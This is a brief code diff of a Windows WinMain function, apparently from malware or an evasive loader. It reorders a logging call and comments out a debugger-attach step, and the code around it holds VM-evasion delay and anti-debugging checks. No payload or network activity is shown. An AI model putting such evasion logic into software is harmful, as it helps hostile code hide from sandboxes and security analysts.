@@ -117,12 +117,9 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 #endif
 	int ret = 0;
-	
 	ret = getapi();
 
-	runLog("starting\r\n");
-
-	ret=VM::delay(VM_EVASION_DELAY);
+	ret = VM::delay(VM_EVASION_DELAY);
 	if (ret < 0) {
 		return -1;
 	}
@@ -147,6 +144,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 		return -1;
 	}
 
+	runLog("starting\r\n");
+
 	if (Debug::isDebugged())
 	{
 		runLog("Debugged\r\n");
@@ -154,7 +153,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 		return FALSE;
 	}
-	Debug::attach();
+	//Debug::attach();
 
 	ghThisHandle = (char*)hInstance;
 	ghprevInstance = hPrevInstance;
